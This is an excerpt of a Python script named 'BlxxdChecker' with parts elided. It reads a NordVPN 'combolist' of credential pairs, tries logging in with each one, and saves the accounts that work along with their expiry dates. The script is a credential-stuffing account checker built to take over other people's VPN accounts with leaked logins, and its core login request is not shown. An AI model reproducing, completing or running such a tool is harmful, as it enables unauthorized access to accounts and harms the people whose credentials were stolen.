...
def login(combo):
	try:
		...
		print(f"\n\u001b[31m[BlxxdChecker] » ¡ERROR! Check your internet connection or your IP and try again. \u001b[0m"+"\n")

def main(): 
	list = open(input(f"\n\u001b[36m[BlxxdChecker] » Insert your NordVPN combolist file name:\u001b[0m "), "r").read().splitlines()
	print("")
	for combo in list:
		if "\"token\":" in login(combo):
			...
			try:
				...
				f.write(combo + "| [WORKING] Date: " + str(exp) + "\n")
				f.close()
				print (f"\u001b[32m[WORKING] » "+ combo +" | Date: " + str(exp))
			except:
				print(f"\u001b[33m[WORKING (NO SERVICE)] » " + combo)
				f.write(combo + " | [WORKING (NO SERVICE)]\n")
				f.close()
		else:
...
if __name__ == "__main__":
	main()
	print(f"\n\u001b[32m[BlxxdChecker] » Finished checking your NordVPN accounts.\u001b[0m\n")
